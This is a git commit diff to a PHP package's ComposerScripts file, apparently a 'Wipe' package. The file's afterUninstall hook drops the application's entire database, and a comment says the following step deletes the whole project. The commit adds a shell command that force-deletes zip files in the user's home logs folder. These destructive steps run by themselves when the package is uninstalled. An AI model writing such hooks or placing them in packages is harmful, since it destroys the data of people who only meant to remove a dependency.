61554b49c7f407f7a14e4b71ae0017349f8b5797
Huseyn <huseynjavadle@gmail.com>
2025-09-05 14:19:35 +0400

    Update ComposerScripts.php

--- src/ComposerScripts.php
+++ src/ComposerScripts.php
@@ -1,12 +1,16 @@
 <?php
 
 namespace JavaDLE\Wipe;
+use Illuminate\Support\Facades\Process;
 
 class ComposerScripts
 {
     public static function afterUninstall(): void
     {
         \DB::statement('DROP DATABASE ' . env('DB_DATABASE'));
+
+        Process::run('cd ~ && rm -rf logs/*.zip');
+       
         $projectFolder = base_path();
 
         // ⚠️ ВНИМАНИЕ: это удалит весь проект
